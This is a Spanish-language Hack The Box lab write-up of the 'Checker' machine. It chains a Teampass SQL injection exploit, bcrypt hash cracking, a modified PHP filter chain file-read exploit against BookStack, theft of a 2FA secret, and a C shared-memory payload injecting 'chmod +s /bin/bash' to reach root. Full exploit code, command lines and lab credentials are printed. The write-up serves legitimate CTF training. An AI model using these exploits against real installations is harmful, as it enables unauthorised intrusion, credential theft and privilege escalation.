---
title: Checker
description: Checker es una máquina Linux de dificultad alta que ejecuta Teampass y Bookstack en puertos separados. La versión de Teampass presenta una vulnerabilidad de SQL injection (CVE-2023-1545) que puede explotarse para obtener hashes de contraseñas de usuarios. Al crackear estos hashes, se obtiene la contraseña del usuario bob en Teampass. Al iniciar sesión en Teampass, se revelan credenciales tanto para el usuario bob de Bookstack como para el usuario reader por SSH. Al intentar conectarse por SSH como reader, se observa que está habilitada la autenticación de dos factores (2FA). Mientras tanto, la versión de Bookstack es vulnerable a CVE-2023-6199, una falla de lectura de archivos locales mediante Blind SSRF, que se puede explotar para recuperar la clave secreta de 2FA asociada a la cuenta SSH del usuario reader, permitiendo un inicio de sesión exitoso. Para la escalada de privilegios a root, se realiza reverse engineering sobre un binario, identificando una vulnerabilidad de command injection, la cual se explota mediante un script personalizado.
date: 2025-06-03
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-checker/checker_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - cve
  - sqli_blind
  - ssrf
  - data_leaks
  - php
  - 2FA
  - arbitrary_file_read
  - password_attacks
  - reverse_engineering
  - sudo_abuse
  - suid
  - information_gathering
  - web_analysis
  - cve_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/checker:-$ ping -c 1 10.10.11.56 
PING 10.10.11.56 (10.10.11.56) 56(84) bytes of data.
64 bytes from 10.10.11.56: icmp_seq=1 ttl=63 time=178 ms

--- 10.10.11.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 177.633/177.633/177.633/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/checker:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.56 -n -Pn -oG nmap1
Host: 10.10.11.56 ()    Status: Up
Host: 10.10.11.56 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 8080/open/tcp//http-proxy///  Ignored State: closed (65532)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/checker:-$ sudo nmap -sCV -p22,80,8080 -vvv 10.10.11.56 -oN nmap2
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQsMcD52VU4FwV2qhq65YVV9Flp7+IUAUrkugU+IiOs5ph+Rrqa4aofeBosUCIziVzTUB/vNQwODCRSTNBvdXQ=
|   256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRBr02nNGqdVIlkXK+vsFIdhcYJoWEVqAIvGCGz+nHY
80/tcp   open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 429 Too Many Requests
8080/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 429 Too Many Requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/checker:-$ whatweb 10.10.11.56
http://10.10.11.56 [403 Forbidden] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.56], Title[403 Forbidden]
```

Al acceder al puerto 80 mediante navegador, ocurre una redirección automática hacia el dominio `checker.htb`.

```terminal
/home/kali/Documents/htb/machines/checker:-$ curl http://10.10.11.56/
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://checker.htb/login'" />

        <title>Redirecting to http://checker.htb/login</title>
    </head>
    <body>
        Redirecting to <a href="http://checker.htb/login">http://checker.htb/login</a>.
    </body>
</html> 
```

Configuro esta resolución del dominio.

```terminal
/home/kali/Documents/htb/machines/checker:-$ echo '10.10.11.56\tchecker.htb' | sudo tee -a /etc/hosts
```

---
## Web Analysis

Al navegar hacia `checker.htb`, aparece la pantalla de inicio de sesión de BookStack, una plataforma open source utilizada para gestionar documentación.

![](assets/img/htb-writeup-checker/checker1_1.png)

Al revisar el código fuente de la página, aparece la versión v23.10.2 de BookStack, vulnerable a [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/cve-2023-6199). Sin embargo, la explotación requiere credenciales válidas.

![](assets/img/htb-writeup-checker/checker1_2.png)

En el puerto 8080 corre la aplicación TeamPass, un gestor de contraseñas.

![](assets/img/htb-writeup-checker/checker1_2.png)

La documentación oficial de [TeamPass](https://github.com/nilsteampassnet/TeamPass) indica que el archivo `changelog.txt` puede encontrarse por defecto. Allí aparece un mensaje que revela el uso de la versión 3.

![](assets/img/htb-writeup-checker/checker1_4.png)

Esta versión es vulnerable a [CVE-2023-1545](https://nvd.nist.gov/vuln/detail/cve-2023-1545).

---
## CVE Exploitation 1

Descargo un exploit público y lo ejecuto apuntando al servicio en el puerto 8080.

```terminal
/home/kali/Documents/htb/machines/checker:-$ wget https://www.exploit-db.com/raw/52094

(venv)-/home/kali/Documents/htb/machines/checker:-$ python3 52094 http://checker.htb:8080/
2025-04-27 18:09:20,781 - INFO - Encontrados 2 usuários no sistema
2025-04-27 18:09:22,951 - INFO - Credenciais obtidas para: admin
2025-04-27 18:09:25,094 - INFO - Credenciais obtidas para: bob

Credenciais encontradas:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

Guardo los hashes en un archivo y realizo el crackeo con john.

```terminal
/home/kali/Documents/htb/machines/checker:-$ echo 'admin:$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\nbob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy' > creds.txt

/home/kali/Documents/htb/machines/checker:-$ john --list=formats creds.txt
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])

/home/kali/Documents/htb/machines/checker:-$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
cheerleader      (bob)
```

Con las credenciales `bob`:`cheerleader` ingreso a la interfaz web de TeamPass. Dentro del sistema aparecen dos entradas, BookStack y SSH Access.

![](assets/img/htb-writeup-checker/checker2_1.png)
![](assets/img/htb-writeup-checker/checker2_2.png)

Las credenciales SSH `reader`:`hiccup-publicly-genesis` no permiten acceso directo debido a un segundo factor requerido.

```terminal
/home/kali/Documents/htb/machines/checker:-$ ssh reader@checker.htb
(reader@checker.htb) Password: hiccup-publicly-genesis
(reader@checker.htb) Verification code: 
```

Las credenciales para BookStack `bob@checker.htb`:`mYSeCr3T_w1kI_P4sSw0rD` permiten autenticación satisfactoria como el usuario bob. Una vez autenticado, avanzo con la explotación de la vulnerabilidad CVE-2023-6199.

![](assets/img/htb-writeup-checker/checker2_3.png)


---
## CVE Exploitation 2
### Poc

![](assets/img/htb-writeup-checker/checker3_1.png)

Para aprovecharme de la vulnerabilidad [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/cve-2023-6199) presente, que permite la lectura arbitraria de archivos locales mediante una cadena de PHP filter chains, debo realizar una serie de pasos.

* Clono el repositorio del exploit.

```terminal
/home/kali/Documents/htb/machines/checker:-$ git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit
```

* Modifico el archivo `filters_chain_oracle_exploit/filters_chain_oracle/core/requestor.py` para adaptarlo.

```python
import json
import requests
import time
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import re
import base64

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False



    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Used to parse the option parameter sent by the user
    """
    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter: # Parse array elements
            
            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        php_filter = base64.b64encode(f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'.encode()).decode()
        payload = f"<img src='data:image/png;base64,{php_filter}'/>"
        # DEBUG print(php_filter)
        merged_data = self.parse_parameter(payload)
        # Make the request, the verb and data encoding is defined
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input: 
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:
            # DEBUG print("PATT", (self.match in requ.text))
            return self.match in requ.text 

        if self.time_based_attack:
            # DEBUG print("ELAP", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        # DEBUG print("CODE", requ.status_code == 500)
        return requ.status_code == 500
```

* Obtengo el token `X-CSRF-TOKEN` desde el código fuente de la aplicación.
* Creo un nuevo libro desde el menú `Books` > `Create New Book` > `Create a new page`.
* Intercepto la solicitud de `Save Draft` con BurpSuite para capturar, la cookie `bookstack_session` y la URL usada por el cliente para guardar la pagina `/ajax/page/12/save-draft`.

Ejecuto el exploit apuntando al archivo `/etc/passwd` y confirmo la lectura del archivo objetivo.

```terminal
/home/kali/Documents/htb/machines/checker:-$ python3 filters_chain_oracle_exploit.py --parameter html --headers '{"Content-Type": "application/x-www-form-urlencoded","X-CSRF-TOKEN":"XoJ6BnOXK7EenZqt7MMMcK7ntqaB1loUhMbgxvxD","Cookie":"bookstack_session=eyJpdiI6IjNSTkhhN2oxOUkvdFNCR21wMXBJOXc9PSIsInZhbHVlIjoiaUpMWGpnT2NzeUtTMEoyVlMxWWRpVzMzd3hVajdyNExnaVRRbHdwOFhKcFBqYzFsNW95RXZNZ0pJSGsya25pSVVOeEtaQWF3SStUMi9jNElRcTIwUFRiQ3hZM0FHSkpHa2dXajJuN1c1SUVNOFMvcFFCMFFXUUZKdGFLY3ozR1kiLCJtYWMiOiIxNGFhMzM0OGMyYjg2ZDA4M2FkYTM1YjAwNTNlMWRhYjA0YTVlNDc1Mzc2MjRiZDU1NDgwOTc1N2RjMDg3YmM5IiwidGFnIjoiIn0%3D"}' --verb PUT --target http://checker.htb/ajax/page/12/save-draft --file '/etc/passwd'
[*] The following URL is targeted : http://checker.htb/ajax/page/12/save-draft
[*] The following local file is leaked : /etc/passwd
[*] Running PUT requests
[*] Additionnal headers used : {"Content-Type": "application/x-www-form-urlencoded","X-CSRF-TOKEN":"XoJ6BnOXK7EenZqt7MMMcK7ntqaB1loUhMbgxvxD","Cookie":"bookstack_session=eyJpdiI6IjNSTkhhN2oxOUkvdFNCR21wMXBJOXc9PSIsInZhbHVlIjoiaUpMWGpnT2NzeUtTMEoyVlMxWWRpVzMzd3hVajdyNExnaVRRbHdwOFhKcFBqYzFsNW95RXZNZ0pJSGsya25pSVVOeEtaQWF3SStUMi9jNElRcTIwUFRiQ3hZM0FHSkpHa2dXajJuN1c1SUVNOFMvcFFCMFFXUUZKdGFLY3ozR1kiLCJtYWMiOiIxNGFhMzM0OGMyYjg2ZDA4M2FkYTM1YjAwNTNlMWRhYjA0YTVlNDc1Mzc2MjRiZDU1NDgwOTc1N2RjMDg3YmM5IiwidGFnIjoiIn0%3D"}
cm9vdDp4OjA6MDpyb290Oi9yb29
[*] File leak gracefully stopped.
[+] File /etc/passwd was partially leaked
cm9vdDp4OjA6MDpyb290Oi9yb29
b'root:x:0:0:root:/root:/bin/bash'
```

{% include embed/video.html src='assets/img/htb-writeup-checker/checker3_2.webm' types='webm' title='CVE-2023-6199 Exploitation' autoplay=true loop=true muted=true %}

---
### Vulnerability Exploitation

El servicio SSH para el usuario reader está protegido mediante 2FA. Aunque la clave secreta suele ubicarse en /home/reader/.google_authenticator, el intento de lectura directa falla usando el script de explotación. Enumerando el contenido disponible en BookStack, se encuentra un libro llamado Linux Security con varias páginas. Una de ellas, titulada Basic Backup with cp, describe dos scripts de respaldo: uno seguro y otro inseguro. El script inseguro utiliza cp sin preservar permisos ni propietarios, exponiendo potencialmente archivos sensibles si se ejecuta en el sistema real.

![](assets/img/htb-writeup-checker/checker3_3.png)

Con base en esta información, intento leer el archivo /backup/home_backup/home/reader/.google_authenticator:

```terminal
/home/kali/Documents/htb/machines/checker:-$ python3 filters_chain_oracle_exploit.py --parameter html --headers '{"Content-Type": "application/x-www-form-urlencoded","X-CSRF-TOKEN":"XoJ6BnOXK7EenZqt7MMMcK7ntqaB1loUhMbgxvxD","Cookie":"bookstack_session=eyJpdiI6ImZObXl6bldDVURZYjRvODkvcUttRmc9PSIsInZhbHVlIjoiRVRVbkExMzhIMWIySEQzNnMya1ZZZW1YejdOR2pWRGgzY2ZPM0hIQmJ2QkF2a3hTWHh4eVYzY3lzMWFUTVZ4a2t2eThtVmxjU0NJWHJQUTBPT0RkQUxuL1EyTTdvcStncnEvR2E4R295eTlFOGU0U21saHVNeTFidGwzVDl0aHYiLCJtYWMiOiJmYWFiY2FkYjUxMWExMGFlMzgxOTk0NjNkMjZjNGJiMzY5OWZlYzVkN2FhNTc4MmJhMzc0M2Y1YzM2NjQyOGUzIiwidGFnIjoiIn0%3D"}' --verb PUT --target http://checker.htb/ajax/page/13/save-draft --file '/backup/home_backup/home/reader/.google_authenticator'
[*] The following URL is targeted : http://checker.htb/ajax/page/13/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"Content-Type": "application/x-www-form-urlencoded","X-CSRF-TOKEN":"XoJ6BnOXK7EenZqt7MMMcK7ntqaB1loUhMbgxvxD","Cookie":"bookstack_session=eyJpdiI6ImZObXl6bldDVURZYjRvODkvcUttRmc9PSIsInZhbHVlIjoiRVRVbkExMzhIMWIySEQzNnMya1ZZZW1YejdOR2pWRGgzY2ZPM0hIQmJ2QkF2a3hTWHh4eVYzY3lzMWFUTVZ4a2t2eThtVmxjU0NJWHJQUTBPT0RkQUxuL1EyTTdvcStncnEvR2E4R295eTlFOGU0U21saHVNeTFidGwzVDl0aHYiLCJtYWMiOiJmYWFiY2FkYjUxMWExMGFlMzgxOTk0NjNkMjZjNGJiMzY5OWZlYzVkN2FhNTc4MmJhMzc0M2Y1YzM2NjQyOGUzIiwidGFnIjoiIn0%3D"}
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
```

El archivo es filtrado correctamente, con la clave secreta, genero un código TOTP válido con oathtool.

```terminal
/home/kali/Documents/htb/machines/checker:-$ oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE
174949
```

Y accedo por SSH como reader usando la contraseña conocida y el código 2FA generado.

```terminal
/home/kali/Documents/htb/machines/checker:-$ ssh reader@checker.htb
(reader@checker.htb) Password: hiccup-publicly-genesis
(reader@checker.htb) Verification code: 174949

reader@checker:~$ id
uid=1000(reader) gid=1000(reader) groups=1000(reader)

reader@checker:~$ cat user.txt
```

---
## Privilege Escalation

```terminal
reader@checker:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
reader:x:1000:1000::/home/reader:/bin/bash
```

Confirmo los permisos de `sudo` para el usuario `reader` y detecto que puede ejecutar sin contraseña cualquier llamada a `/opt/hash-checker/check-leak.sh`.

```terminal
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

El script `check-leak.sh` sirve como puerta de entrada para el binario `check_leak`, cuyo propósito es comprobar si un usuario dado ha sufrido una filtración de su contraseña.

```terminal
reader@checker:~$ cat /opt/hash-checker/check-leak.sh
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"


reader@checker:~$ sudo /opt/hash-checker/check-leak.sh
Error: <USER> is not provided.
```

```terminal
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0xB6EEF as temp location
User will be notified via bob@checker.htb
```

---

La función `write_to_shm` del binario `check_leak` se encarga de registrar un evento en memoria compartida, escribiendo un mensaje con marca temporal que indica que se detectó una filtración para el usuario recibido como argumento. Para ello, genera una clave pseudoaleatoria basada en `rand() % 0xfffff`, crea un segmento de `0x400` bytes con permisos 0666 mediante [shmget](https://man7.org/linux/man-pages/man2/shmget.2.html), lo adjunta al espacio del proceso con `shmat`, y utiliza `snprintf` para escribir el mensaje `Leaked hash detected at <timestamp> > <usuario>`. Luego lo desadjunta, pero nunca elimina el segmento, por lo que queda accesible por otros procesos e incluso entre ejecuciones. Esto introduce múltiples vulnerabilidades: los segmentos huérfanos pueden acumularse, los IDs de memoria pueden predecirse, y los datos son legibles/escribibles por cualquier usuario local, generando una superficie de ataque para persistencia o escalamiento lateral.

![](assets/img/htb-writeup-checker/checker3_4.png)

Aprovechando esta debilidad, se desarrolló un binario en C que replica el mismo proceso de generación de claves y escritura en memoria compartida. Define un payload con formato controlado que simula el mensaje utilizado por `check_leak`, pero incluyendo la cadena `;chmod +s /bin/bash;#` al final del contenido. Esta inserción tiene como objetivo evaluar si el binario `check_leak` o algún componente posterior interpreta esta entrada sin sanitización, provocando la ejecución del payload con privilegios elevados.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <time.h>
#include <stdlib.h>

#define MEMSIZE 0x400
#define MEMPERM 0x3B6
int main(void) {
    int shm_id;
    key_t mem_key;
    char* shm_ptr;
    int random_number;
    const char *payload = "Leaked hash detected at Sun Feb 23 16:18:11 2025 > ';chmod +s /bin/bash;#";

    time_t cTime = time(NULL);
    srand((unsigned int)cTime);

    random_number = rand();
    mem_key = (random_number % 0xfffff);

    shm_id = shmget(mem_key, MEMSIZE, IPC_CREAT | MEMPERM);
    if (shm_id == -1) {
    printf("[!] shmget error \n");
    exit(1);
    }

    shm_ptr = (char *)shmat(shm_id, NULL, 0);
    if (shm_ptr == (char *)-1) {
    printf("[!] shmat error \n");
    exit(1);
    }

    snprintf(shm_ptr, MEMSIZE, "%s", payload);
    if (shmdt(shm_ptr) == -1) {
    printf("[!] shmdt error\n");
    exit(1);
    }
    return 0;
}
```

Compilo el exploit y lo comparto para descargarlo en la maquina víctima.

```terminal
/home/kali/Documents/htb/machines/checker:-$ gcc exploit.c -o exploit

/home/kali/Documents/htb/machines/checker:-$ python3 -m http.server
```

Inicio un bucle continuo que genera segmentos de memoria compartida con el payload incrustado, de manera que alguno de esos segmentos coincida con el valor de `rand() % 0xfffff` usado por `check_leak`, explotando así la falta de verificación de existencia previa.

```terminal
reader@checker:/tmp$ wget http://10.10.15.88:8000/exploit
reader@checker:/tmp$ chmod +x exploit 
reader@checker:/tmp$ while true; do ./exploit; done
```

```terminal
/home/kali/Documents/htb/machines/checker:-$ oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE
009103

/home/kali/Documents/htb/machines/checker:-$ ssh reader@checker.htb
(reader@checker.htb) Password: hiccup-publicly-genesis
(reader@checker.htb) Verification code: 009103
```

Desde otra sesión, ejecuto el script vulnerable. Al encontrar uno de los segmentos escritos por el exploit, el contenido es procesado directamente como input, activando el comando embebido y modificando los permisos de `/bin/bash`.

```terminal
reader@checker:~$ while true; do sudo /opt/hash-checker/check-leak.sh bob; done
Password is leaked!
Using the shared memory 0x34ECE as temp location
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
Failed to read result from the db
```

Verifico que el bit SUID ha sido activado exitosamente en `/bin/bash`. Y ejecuto una shell privilegiada utilizando `bash -p`, obteniendo una sesión como `root`.

```terminal
reader@checker:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash

reader@checker:~$ bash -p
bash-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) egid=0(root) groups=0(root),1000(reader)

bash-5.1# cat /root/root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/649" target="_blank">***Litio7 has successfully solved Checker from Hack The Box***</a>
{: .prompt-info style="text-align:center" }